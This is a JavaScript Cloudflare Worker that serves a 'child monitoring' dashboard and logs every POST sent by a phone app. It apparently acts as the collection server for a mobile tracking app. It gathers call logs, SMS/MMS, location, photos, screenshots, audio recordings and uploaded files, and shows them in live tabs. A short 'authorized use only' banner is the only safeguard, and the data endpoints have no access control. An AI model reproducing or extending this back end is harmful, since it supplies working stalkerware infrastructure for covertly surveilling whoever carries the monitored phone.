let captures = [];
const MAX_CAPTURES = 2000;

// ============ DASHBOARD HTML ============
const DASHBOARD_HTML = `<!DOCTYPE html>
<html lang="en" dir="ltr">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<meta name="theme-color" content="#337ab7">
<title>Guardian Panel — Child Monitoring Dashboard</title>
<link rel="icon" type="image/png" href="favicon.png">
<style>
* { box-sizing: border-box; margin: 0; padding: 0; }
html { font-size: 16px; }
body { font-family: 'Segoe UI', Roboto, Helvetica, Arial, sans-serif; background: #0b0f19; color: #e2e8f0; margin: 0; overflow-x: hidden; }
a { color: #38bdf8; text-decoration: none; }
a:hover { color: #60a5fa; }

/* Top Bar */
.topbar { background: #1e293b; color: #fff; padding: 12px 24px; display: flex; align-items: center; justify-content: space-between; border-bottom: 1px solid #334155; position: sticky; top: 0; z-index: 100; }
.topbar .logo { font-size: 1.25rem; font-weight: 700; color: #38bdf8; display: flex; align-items: center; gap: 10px; }
.topbar .user-info { font-size: 0.85rem; opacity: 0.8; }
.topbar .status { font-size: 0.75rem; padding: 4px 10px; background: #166534; color: #bbf7d0; border-radius: 12px; border: 1px solid #22c55e; }

/* Container */
.container { max-width: 1400px; margin: 0 auto; padding: 20px; }

/* Header */
.page-header { margin-bottom: 24px; }
.page-header h1 { font-size: 1.75rem; color: #38bdf8; margin-bottom: 8px; }
.page-header p { color: #94a3b8; font-size: 0.95rem; }

/* Stats Row */
.stats-row { display: grid; grid-template-columns: repeat(auto-fit, minmax(220px, 1fr)); gap: 16px; margin-bottom: 24px; }
.stat-card { background: #1e293b; border: 1px solid #334155; border-radius: 12px; padding: 20px; display: flex; align-items: center; gap: 16px; transition: transform 0.2s; }
.stat-card:hover { transform: translateY(-2px); border-color: #38bdf8; }
.stat-icon { font-size: 2rem; width: 60px; height: 60px; background: #0f172a; border-radius: 12px; display: flex; align-items: center; justify-content: center; border: 2px solid #334155; }
.stat-content h3 { font-size: 2rem; color: #fff; margin-bottom: 4px; }
.stat-content p { color: #94a3b8; font-size: 0.85rem; text-transform: uppercase; letter-spacing: 0.5px; }

/* Tabs */
.tabs { display: flex; gap: 0; border-bottom: 2px solid #334155; margin-bottom: 24px; overflow-x: auto; }
.tab-btn { padding: 12px 20px; background: transparent; border: none; border-bottom: 2px solid transparent; color: #94a3b8; cursor: pointer; font-size: 0.9rem; font-weight: 600; white-space: nowrap; transition: all 0.2s; }
.tab-btn:hover { color: #cbd5e1; background: #0f172a; }
.tab-btn.active { color: #38bdf8; border-bottom-color: #38bdf8; background: rgba(56, 189, 248, 0.1); }

/* Sections */
.section { display: none; animation: fadeIn 0.3s; }
.section.active { display: block; }
@keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }

.section-header { margin-bottom: 16px; display: flex; justify-content: space-between; align-items: center; flex-wrap: wrap; gap: 10px; }
.section-header h2 { font-size: 1.25rem; color: #fff; }
.section-header .badge { font-size: 0.75rem; padding: 4px 10px; background: #334155; color: #94a3b8; border-radius: 6px; }

/* Table */
.table-wrap { overflow-x: auto; border: 1px solid #334155; border-radius: 8px; background: #0f172a; }
table { width: 100%; border-collapse: collapse; background: #0f172a; }
th, td { padding: 12px 14px; text-align: left; border-bottom: 1px solid #334155; vertical-align: middle; }
th { background: #1e293b; color: #94a3b8; font-size: 0.8rem; text-transform: uppercase; letter-spacing: 0.5px; position: sticky; top: 0; z-index: 2; }
tr:hover { background: #1e293b; }
.method-badge { font-size: 0.75rem; padding: 2px 8px; border-radius: 4px; font-weight: 700; }
.method-POST { background: #2563eb; color: #fff; }
.method-GET { background: #059669; color: #fff; }
.path-cell { font-family: 'Courier New', monospace; font-size: 0.85rem; color: #a5b4fc; word-break: break-all; max-width: 200px; }
.body-cell { font-family: 'Courier New', monospace; font-size: 0.8rem; color: #cbd5e1; max-width: 300px; word-break: break-all; white-space: pre-wrap; }
.time-cell { font-size: 0.8rem; color: #94a3b8; font-family: 'Courier New', monospace; }
.ip-cell { font-size: 0.8rem; color: #64748b; }

/* Media Gallery */
.media-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(200px, 1fr)); gap: 16px; }
.media-card { background: #1e293b; border: 1px solid #334155; border-radius: 10px; overflow: hidden; display: flex; flex-direction: column; }
.media-thumb { width: 100%; height: 150px; background: #0f172a; display: flex; align-items: center; justify-content: center; color: #64748b; font-size: 0.9rem; border-bottom: 1px solid #334155; }
.media-thumb img { width: 100%; height: 100%; object-fit: cover; display: block; }
.media-thumb video { width: 100%; height: 100%; object-fit: cover; display: block; }
.media-thumb audio { width: 100%; margin-top: 8px; }
.media-info { padding: 12px; display: flex; flex-direction: column; gap: 6px; }
.media-name { font-size: 0.85rem; color: #e2e8f0; white-space: nowrap; overflow: hidden; text-overflow: ellipsis; }
.media-meta { font-size: 0.75rem; color: #94a3b8; display: flex; gap: 10px; flex-wrap: wrap; }
.media-type-badge { font-size: 0.7rem; padding: 2px 6px; border-radius: 4px; font-weight: 700; text-transform: uppercase; }
.type-image { background: rgba(16, 185, 129, 0.15); color: #4ade80; }
.type-audio { background: rgba(59, 130, 246, 0.15); color: #60a5fa; }
.type-video { background: rgba(239, 68, 68, 0.15); color: #f87171; }
.type-file { background: rgba(168, 85, 247, 0.15); color: #c084fc; }

/* Buttons */
.btn { padding: 8px 16px; border: none; border-radius: 6px; cursor: pointer; font-size: 0.85rem; font-weight: 600; transition: all 0.2s; display: inline-flex; align-items: center; gap: 6px; }
.btn-primary { background: #38bdf8; color: #000; }
.btn-primary:hover { background: #60a5fa; }
.btn-danger { background: #dc2626; color: #fff; }
.btn-danger:hover { background: #ef4444; }
.btn-success { background: #16a34a; color: #fff; }
.btn-success:hover { background: #22c55e; }
.btn-sm { padding: 6px 12px; font-size: 0.8rem; }

/* Empty State */
.empty-state { text-align: center; padding: 60px 20px; color: #64748b; }
.empty-state h3 { color: #94a3b8; margin-bottom: 8px; }
.empty-state p { font-size: 0.9rem; }

/* Alerts */
.alert { padding: 12px 16px; border-radius: 8px; margin-bottom: 16px; font-size: 0.9rem; }
.alert-warning { background: #7f1d1d; color: #fecaca; border: 1px solid #991b1b; }
.alert-success { background: #14532d; color: #bbf7d0; border: 1px solid #15803d; }

/* Live View */
.live-view { background: #0f172a; border: 2px solid #334155; border-radius: 12px; padding: 24px; text-align: center; }
.live-status { display: inline-block; padding: 6px 14px; border-radius: 20px; font-weight: 700; margin-bottom: 16px; }
.live-active { background: #166534; color: #bbf7d0; border: 1px solid #22c55e; animation: pulse 2s infinite; }
@keyframes pulse { 0%, 100% { opacity: 1; } 50% { opacity: 0.6; } }

/* File Preview */
.file-preview { max-width: 100%; max-height: 400px; border-radius: 8px; border: 1px solid #334155; }

/* Scrollbar */
::-webkit-scrollbar { width: 8px; height: 8px; }
::-webkit-scrollbar-track { background: #0f172a; }
::-webkit-scrollbar-thumb { background: #334155; border-radius: 4px; }
::-webkit-scrollbar-thumb:hover { background: #475569; }

/* Responsive */
@media (max-width: 768px) { .container { padding: 12px; } .stat-content h3 { font-size: 1.5rem; } .tab-btn { padding: 10px 14px; font-size: 0.8rem; } }
</style>
</head>
<body>

<!-- Top Bar -->
<nav class="topbar">
  <div class="logo">🛡️ Guardian Panel</div>
  <div class="user-info">Owner: You</div>
  <div class="status">● ONLINE</div>
</nav>

<div class="container">
  <div class="page-header">
    <h1>Child Monitoring Dashboard</h1>
    <p>Real-time data capture from your authorized device. All data stays on <strong>your</strong> server.</p>
  </div>

  <!-- Stats -->
  <div class="stats-row">
    <div class="stat-card">
      <div class="stat-icon">📊</div>
      <div class="stat-content"><h3 id="stat-total">0</h3><p>Total Requests</p></div>
    </div>
    <div class="stat-card">
      <div class="stat-icon">📷</div>
      <div class="stat-content"><h3 id="stat-media">0</h3><p>Media Files</p></div>
    </div>
    <div class="stat-card">
      <div class="stat-icon">📞</div>
      <div class="stat-content"><h3 id="stat-calls">0</h3><p>Call Logs</p></div>
    </div>
    <div class="stat-card">
      <div class="stat-icon">📍</div>
      <div class="stat-content"><h3 id="stat-location">0</h3><p>Location Pings</p></div>
    </div>
    <div class="stat-card">
      <div class="stat-icon">💬</div>
      <div class="stat-content"><h3 id="stat-sms">0</h3><p>SMS / MMS</p></div>
    </div>
  </div>

  <!-- Tabs -->
  <div class="tabs">
    <button class="tab-btn active" onclick="switchTab('dashboard')">📊 Dashboard</button>
    <button class="tab-btn" onclick="switchTab('media')">📷 Media (Photo/Video/Audio)</button>
    <button class="tab-btn" onclick="switchTab('calls')">📞 Call Logs</button>
    <button class="tab-btn" onclick="switchTab('sms')">💬 SMS / MMS</button>
    <button class="tab-btn" onclick="switchTab('location')">📍 Location</button>
    <button class="tab-btn" onclick="switchTab('files')">📁 File Explorer</button>
    <button class="tab-btn" onclick="switchTab('live')">📺 Live Viewing</button>
    <button class="tab-btn" onclick="switchTab('all')">📋 All Requests</button>
  </div>

  <!-- Dashboard Section -->
  <section id="section-dashboard" class="section active">
    <div class="alert alert-warning">
      ⚠️ <strong>Authorized Use Only:</strong> This panel is for monitoring your own child's device. Unauthorized monitoring is illegal.
    </div>
    <div class="alert alert-success">
      ✅ <strong>Secure:</strong> All data is captured on your own Cloudflare Worker. Nothing goes to the original tracker server.
    </div>
    <div class="section-header"><h2>Quick Actions</h2></div>
    <div style="display:flex;gap:10px;flex-wrap:wrap;">
      <button class="btn btn-primary" onclick="fetchData()">🔄 Refresh Data</button>
      <button class="btn btn-danger" onclick="clearAll()">🗑️ Clear All Records</button>
      <button class="btn btn-success" onclick="window.location.reload()">🔄 Reload Page</button>
    </div>
  </div>

  <!-- Media Section -->
  <section id="section-media" class="section">
    <div class="section-header"><h2>📷 Media Files</h2><span class="badge" id="media-count">0 files</span></div>
    <div class="media-grid" id="media-grid">
      <div class="empty-state"><h3>No media files yet</h3><p>Photos, videos, and audio recordings will appear here.</p></div>
    </div>
  </section>

  <!-- Calls Section -->
  <section id="section-calls" class="section">
    <div class="section-header"><h2>📞 Call Logs</h2><span class="badge" id="calls-count">0 calls</span></div>
    <div class="table-wrap">
      <table>
        <thead>
          <tr><th>Time</th><th>Type</th><th>Number</th><th>Duration</th><th>Endpoint</th><th>Data</th></tr>
        </thead>
        <tbody id="calls-table">
          <tr><td colspan="6" class="empty-state">No call logs captured yet.</td></tr>
        </tbody>
      </table>
    </div>
  </section>

  <!-- SMS Section -->
  <section id="section-sms" class="section">
    <div class="section-header"><h2>💬 SMS / MMS</h2><span class="badge" id="sms-count">0 messages</span></div>
    <div class="table-wrap">
      <table>
        <thead>
          <tr><th>Time</th><th>Type</th><th>Number</th><th>Message</th><th>Endpoint</th></tr>
        </thead>
        <tbody id="sms-table">
          <tr><td colspan="5" class="empty-state">No SMS/MMS captured yet.</td></tr>
        </tbody>
      </table>
    </div>
  </section>

  <!-- Location Section -->
  <section id="section-location" class="section">
    <div class="section-header"><h2>📍 Location History</h2><span class="badge" id="location-count">0 pings</span></div>
    <div class="table-wrap">
      <table>
        <thead>
          <tr><th>Time</th><th>Latitude</th><th>Longitude</th><th>Address</th><th>Accuracy</th><th>Endpoint</th></tr>
        </thead>
        <tbody id="location-table">
          <tr><td colspan="6" class="empty-state">No location data captured yet.</td></tr>
        </tbody>
      </table>
    </div>
  </section>

  <!-- Files Section -->
  <section id="section-files" class="section">
    <div class="section-header"><h2>📁 File Explorer</h2><span class="badge" id="files-count">0 files</span></div>
    <div class="table-wrap">
      <table>
        <thead>
          <tr><th>Time</th><th>File Name</th><th>Size</th><th>Endpoint</th><th>Data</th></tr>
        </thead>
        <tbody id="files-table">
          <tr><td colspan="5" class="empty-state">No files captured yet.</td></tr>
        </tbody>
      </table>
    </div>
  </section>

  <!-- Live Viewing Section -->
  <section id="section-live" class="section">
    <div class="section-header"><h2>📺 Live Viewing</h2><span class="badge">Real-time</span></div>
    <div class="live-view">
      <div class="live-status live-active">🔴 LIVE MONITORING ACTIVE</div>
      <p style="color:#94a3b8;">Waiting for live data from device...</p>
      <div id="live-feed" style="margin-top:20px;text-align:left;color:#94a3b8;font-size:0.9rem;font-family:monospace;">No live events yet.</div>
    </div>
  </section>

  <!-- All Requests Section -->
  <section id="section-all" class="section">
    <div class="section-header"><h2>📋 All Captured Requests</h2><span class="badge" id="all-count">0 requests</span></div>
    <div class="table-wrap">
      <table>
        <thead>
          <tr><th>Time</th><th>Method</th><th>Endpoint</th><th>Type</th><th>Data / Body</th><th>IP</th></tr>
        </thead>
        <tbody id="all-table">
          <tr><td colspan="6" class="empty-state">No requests captured yet.</td></tr>
        </tbody>
      </table>
    </div>
  </section>
</div>

<script>
let captures = [];

async function loadData() {
  try {
    const r = await fetch('/api/captures');
    captures = await r.json();
    renderAll();
  } catch (e) {
    console.error('Load error:', e);
  }
}

function renderAll() {
  updateStats();
  renderDashboard();
  renderMedia();
  renderCalls();
  renderSMS();
  renderLocation();
  renderFiles();
  renderLive();
  renderAllRequests();
}

function updateStats() {
  document.getElementById('stat-total').textContent = captures.length;
  const media = captures.filter(c => c.path.includes('pictures') || c.path.includes('screenshot') || c.path.includes('recordAudio')).length;
  const calls = captures.filter(c => c.path.includes('calls')).length;
  const location = captures.filter(c => c.path.includes('location')).length;
  const sms = captures.filter(c => c.path.includes('sms') || c.path.includes('mms')).length;
  document.getElementById('stat-media').textContent = media;
  document.getElementById('stat-calls').textContent = calls;
  document.getElementById('stat-location').textContent = location;
  document.getElementById('stat-sms').textContent = sms;
}

function renderDashboard() {
  // Dashboard is static mostly
}

function renderMedia() {
  const grid = document.getElementById('media-grid');
  const media = captures.filter(c => c.path.includes('pictures') || c.path.includes('screenshot') || c.path.includes('recordAudio'));
  document.getElementById('media-count').textContent = media.length + ' files';
  
  if (!media.length) {
    grid.innerHTML = '<div class="empty-state"><h3>No media files yet</h3><p>Photos, videos, and audio recordings will appear here.</p></div>';
    return;
  }
  
  grid.innerHTML = media.map(c => {
    const isImage = c.path.includes('pictures') || c.path.includes('screenshot');
    const isAudio = c.path.includes('recordAudio');
    const isVideo = c.path.includes('video');
    const typeClass = isImage ? 'type-image' : isAudio ? 'type-audio' : isVideo ? 'type-video' : 'type-file';
    const typeLabel = isImage ? 'IMAGE' : isAudio ? 'AUDIO' : isVideo ? 'VIDEO' : 'FILE';
    
    return `
      <div class="media-card">
        <div class="media-thumb">
          ${isImage ? `<img src="data:image/jpeg;base64,${c.body || ''}" alt="${c.path}" onerror="this.style.display='none';this.parentElement.innerHTML='📷'>" : ''}
          ${isVideo ? `<video controls src="${c.body || ''}" onerror="this.style.display='none';this.parentElement.innerHTML='🎥'>" : ''}
          ${isAudio ? `<audio controls src="${c.body || ''}" onerror="this.style.display='none';this.parentElement.innerHTML='🎵'>" : ''}
          ${!isImage && !isVideo && !isAudio ? '📄' : ''}
        </div>
        <div class="media-info">
          <div class="media-name">${c.path.split('/').pop() || 'unknown'}</div>
          <div class="media-meta">
            <span class="media-type-badge ${typeClass}">${typeLabel}</span>
            <span>${new Date(c.time).toLocaleDateString()}</span>
          </div>
        </div>
      </div>
    `;
  }).join('');
}

function renderCalls() {
  const tbody = document.getElementById('calls-table');
  const calls = captures.filter(c => c.path.includes('calls'));
  document.getElementById('calls-count').textContent = calls.length + ' calls';
  
  if (!calls.length) {
    tbody.innerHTML = '<tr><td colspan="6" class="empty-state">No call logs captured yet.</td></tr>';
    return;
  }
  
  tbody.innerHTML = calls.map(c => {
    const fields = c.fields || {};
    return `
      <tr>
        <td class="time-cell">${new Date(c.time).toLocaleString()}</td>
        <td><span class="badge" style="background:#334155;color:#cbd5e1;">${fields.type || 'CALL'}</span></td>
        <td>${fields.number || fields.idPhone || 'Unknown'}</td>
        <td>${fields.duration || fields.data || '—'}</td>
        <td class="path-cell">${c.path}</td>
        <td class="body-cell">${escapeHtml(JSON.stringify(c.fields)).slice(0,100)}</td>
      </tr>
    `;
  }).join('');
}

function renderSMS() {
  const tbody = document.getElementById('sms-table');
  const sms = captures.filter(c => c.path.includes('sms') || c.path.includes('mms'));
  document.getElementById('sms-count').textContent = sms.length + ' messages';
  
  if (!sms.length) {
    tbody.innerHTML = '<tr><td colspan="5" class="empty-state">No SMS/MMS captured yet.</td></tr>';
    return;
  }
  
  tbody.innerHTML = sms.map(c => {
    const fields = c.fields || {};
    return `
      <tr>
        <td class="time-cell">${new Date(c.time).toLocaleString()}</td>
        <td><span class="badge" style="background:#334155;color:#cbd5e1;">${c.path.includes('mms') ? 'MMS' : 'SMS'}</span></td>
        <td>${fields.number || fields.idPhone || 'Unknown'}</td>
        <td class="body-cell">${escapeHtml(fields.data || c.body || '').slice(0,120)}</td>
        <td class="path-cell">${c.path}</td>
      </tr>
    `;
  }).join('');
}

function renderLocation() {
  const tbody = document.getElementById('location-table');
  const loc = captures.filter(c => c.path.includes('location'));
  document.getElementById('location-count').textContent = loc.length + ' pings';
  
  if (!loc.length) {
    tbody.innerHTML = '<tr><td colspan="6" class="empty-state">No location data captured yet.</td></tr>';
    return;
  }
  
  tbody.innerHTML = loc.map(c => {
    const fields = c.fields || {};
    return `
      <tr>
        <td class="time-cell">${new Date(c.time).toLocaleString()}</td>
        <td>${fields.latitude || '—'}</td>
        <td>${fields.longitude || '—'}</td>
        <td class="body-cell">${escapeHtml(fields.address || '—').slice(0,60)}</td>
        <td>${fields.accuracy || '—'}</td>
        <td class="path-cell">${c.path}</td>
      </tr>
    `;
  }).join('');
}

function renderFiles() {
  const tbody = document.getElementById('files-table');
  const files = captures.filter(c => c.path.includes('fileExplorer'));
  document.getElementById('files-count').textContent = files.length + ' files';
  
  if (!files.length) {
    tbody.innerHTML = '<tr><td colspan="5" class="empty-state">No files captured yet.</td></tr>';
    return;
  }
  
  tbody.innerHTML = files.map(c => {
    const fields = c.fields || {};
    return `
      <tr>
        <td class="time-cell">${new Date(c.time).toLocaleString()}</td>
        <td class="body-cell">${fields.originalname || fields.name || 'Unknown'}</td>
        <td>${fields.size ? (fields.size/1024).toFixed(1) + ' KB' : '—'}</td>
        <td class="path-cell">${c.path}</td>
        <td class="body-cell">${escapeHtml(JSON.stringify(c.fields)).slice(0,80)}</td>
      </tr>
    `;
  }).join('');
}

function renderLive() {
  const feed = document.getElementById('live-feed');
  const recent = captures.slice(0, 5);
  if (!recent.length) {
    feed.innerHTML = '<div style="color:#64748b;">No live events yet.</div>';
    return;
  }
  feed.innerHTML = recent.map(c => `<div style="margin:6px 0; padding:8px; background:#020617; border-left:3px solid #38bdf8; font-size:0.85rem;"><strong>${new Date(c.time).toLocaleTimeString()}</strong> — ${c.path}</div>`).join('');
}

function renderAllRequests() {
  const tbody = document.getElementById('all-table');
  document.getElementById('all-count').textContent = captures.length + ' requests';
  
  if (!captures.length) {
    tbody.innerHTML = '<tr><td colspan="6" class="empty-state">No requests captured yet.</td></tr>';
    return;
  }
  
  tbody.innerHTML = captures.map(c => {
    const type = c.path.includes('pictures') || c.path.includes('screenshot') ? 'MEDIA' :
                 c.path.includes('calls') ? 'CALL' :
                 c.path.includes('location') ? 'LOCATION' :
                 c.path.includes('sms') || c.path.includes('mms') ? 'SMS' :
                 c.path.includes('fileExplorer') ? 'FILE' : 'OTHER';
    const typeClass = type === 'MEDIA' ? 'type-image' : type === 'CALL' ? 'type-audio' : type === 'LOCATION' ? 'type-video' : type === 'SMS' ? 'type-file' : 'type-file';
    return `
      <tr>
        <td class="time-cell">${new Date(c.time).toLocaleString()}</td>
        <td><span class="method-badge method-${c.method}">${c.method}</span></td>
        <td class="path-cell">${c.path}</td>
        <td><span class="media-type-badge ${typeClass}">${type}</span></td>
        <td class="body-cell">${escapeHtml(typeof c.body === 'string' ? c.body : JSON.stringify(c.fields || {})).slice(0,120)}</td>
        <td class="ip-cell">${c.ip}</td>
      </tr>
    `;
  }).join('');
}

function switchTab(tabName) {
  // Hide all sections
  document.querySelectorAll('.section').forEach(s => s.classList.remove('active'));
  // Remove active from all tabs
  document.querySelectorAll('.tab-btn').forEach(b => b.classList.remove('active'));
  
  // Show selected section
  document.getElementById('section-' + tabName).classList.add('active');
  // Activate tab button
  event.target.classList.add('active');
  renderAll();
}

async function fetchData() {
  await loadData();
}

async function clearAll() {
  if (!confirm('Clear ALL captured records? This cannot be undone.')) return;
  try {
    await fetch('/api/clear', { method: 'POST' });
    captures = [];
    renderAll();
    alert('All records cleared.');
  } catch (e) {
    alert('Failed to clear records.');
  }
}

function escapeHtml(s) {
  return String(s)
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;')
    .replace(/'/g, '&#39;');
}

// Auto refresh every 5 seconds
setInterval(loadData, 5000);
// Initial load
loadData();
</script>
</body>
</html>`;

// ============ WORKER LOGIC ============
addEventListener('fetch', event => {
  event.respondWith(handleRequest(event.request))
})

async function handleRequest(request) {
  const url = new URL(request.url);
  const method = request.method;
  const path = url.pathname;

  const cors = {
    'Access-Control-Allow-Origin': '*',
    'Access-Control-Allow-Methods': 'GET, POST, OPTIONS',
    'Access-Control-Allow-Headers': 'Content-Type'
  };

  if (method === 'OPTIONS') {
    return new Response(null, { headers: cors });
  }

  // Root - HTML Dashboard
  if (path === '/') {
    if (method !== 'GET') return new Response('Method not allowed', { status: 405 });
    return new Response(DASHBOARD_HTML, {
      headers: { 'content-type': 'text/html; charset=utf-8' }
    });
  }

  // API: Get captures
  if (path === '/api/captures' && method === 'GET') {
    return new Response(JSON.stringify(captures, null, 2), {
      headers: { ...cors, 'content-type': 'application/json' }
    });
  }

  // API: Clear captures
  if (path === '/api/clear' && method === 'POST') {
    captures = [];
    return new Response(JSON.stringify({ ok: true, message: 'All records cleared' }), {
      headers: { ...cors, 'content-type': 'application/json' }
    });
  }

  // Any POST - capture APK data
  if (method === 'POST') {
    let bodyPreview = null;
    let fields = {};
    let files = [];

    try {
      const contentType = request.headers.get('content-type') || '';

      if (contentType.includes('multipart/form-data')) {
        const formData = await request.formData();
        for (const [key, value] of formData.entries()) {
          if (value instanceof File) {
            files.push({
              fieldname: key,
              originalname: value.name,
              mimetype: value.type,
              size: value.size
            });
            fields[key] = '[FILE] ' + value.name;
          } else {
            fields[key] = value;
          }
        }
        bodyPreview = JSON.stringify(fields, null, 2);
      } else {
        const text = await request.text();
        bodyPreview = text;
        const params = new URLSearchParams(text);
        for (const [key, value] of params) fields[key] = value;
      }
    } catch (e) {
      bodyPreview = '[parse error] ' + String(e);
    }

    const cap = {
      id: Date.now() + '-' + Math.random().toString(36).slice(2, 8),
      time: new Date().toISOString(),
      method: 'POST',
      path: path,
      query: Object.fromEntries(url.searchParams),
      headers: Object.fromEntries(request.headers.entries()),
      body: bodyPreview,
      fields: fields,
      files: files,
      ip: request.headers.get('cf-connecting-ip')
    };

    captures.unshift(cap);
    if (captures.length > MAX_CAPTURES) captures.pop();

    return new Response(JSON.stringify({ status: 'ok', captured_id: cap.id }), {
      headers: { ...cors, 'content-type': 'application/json' }
    });
  }

  return new Response('Not found', { status: 404, headers: cors });
}
